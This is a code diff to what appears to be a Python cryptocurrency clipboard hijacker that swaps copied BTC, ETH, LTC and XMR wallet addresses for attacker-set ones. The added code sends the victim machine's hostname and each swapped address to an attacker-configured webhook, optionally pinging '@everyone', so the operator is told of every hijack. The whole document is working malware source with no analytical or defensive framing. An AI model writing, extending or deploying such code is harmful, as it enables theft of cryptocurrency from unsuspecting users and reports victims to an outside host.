@@ -1,6 +1,9 @@
+import http.client
 import subprocess
+import socket
 import winreg
 import shutil
+import json
 import time
 import sys
 import re
@@ -12,6 +15,19 @@ ltcaddr = "SET LTC ADDRESS HERE"
 xmraddr = "SET XMR ADDRESS HERE"
 
 single_use = False
+
+ping = False
+webhook_url = ""
+
+webhook_parts = webhook_url.replace("https://", "").split("/")
+host = webhook_parts[0]
+url_path = "/" + "/".join(webhook_parts[1:])
+
+headers = {
+    'Content-Type': 'application/json'
+}
+
+comp_name = socket.gethostname()
 
 def is_crypto_addr(clipboard_text):
     try:
@@ -50,6 +66,25 @@ def main():
                                 o.write("True")
                                 o.close()
                             sys.exit()
+                        if webhook_url != "":
+                            if ping:
+                                message = {
+                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                }
+                            else:
+                                message = {
+                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                }
+
+                            json_data = json.dumps(message)
+
+                            conn = http.client.HTTPSConnection(host)
+                            conn.request("POST", url_path, json_data, headers)
+
+                            response = conn.getresponse()
+
+                            response.read()
+                            conn.close()
                     else:
                         pass
                 elif var == "ETH":
@@ -61,6 +96,25 @@ def main():
                                 o.write("True")
                                 o.close()
                             sys.exit()
+                        if webhook_url != "":
+                            if ping:
+                                message = {
+                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
+                                }
+                            else:
+                                message = {
+                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
+                                }
+
+                            json_data = json.dumps(message)
+
+                            conn = http.client.HTTPSConnection(host)
+                            conn.request("POST", url_path, json_data, headers)
+
+                            response = conn.getresponse()
+
+                            response.read()
+                            conn.close()
                     else:
                         pass
                 elif var == "LTC":
@@ -72,6 +126,25 @@ def main():
                                 o.write("True")
                                 o.close()
                             sys.exit()
+                        if webhook_url != "":
+                            if ping:
+                                message = {
+                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                }
+                            else:
+                                message = {
+                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                }
+                            
+                            json_data = json.dumps(message)
+
+                            conn = http.client.HTTPSConnection(host)
+                            conn.request("POST", url_path, json_data, headers)
+
+                            response = conn.getresponse()
+
+                            response.read()
+                            conn.close()
                     else:
                         pass
                 elif var == "XMR":
@@ -83,6 +156,25 @@ def main():
                                 o.write("True")
                                 o.close()
                             sys.exit()
+                        if webhook_url != "":
+                            if ping:
+                                message = {
+                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
+                                }
+                            else:
+                                message = {
+                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
+                                }
+
+                            json_data = json.dumps(message)
+
+                            conn = http.client.HTTPSConnection(host)
+                            conn.request("POST", url_path, json_data, headers)
+
+                            response = conn.getresponse()
+
+                            response.read()
+                            conn.close()
                     else:
                         pass
                 else:
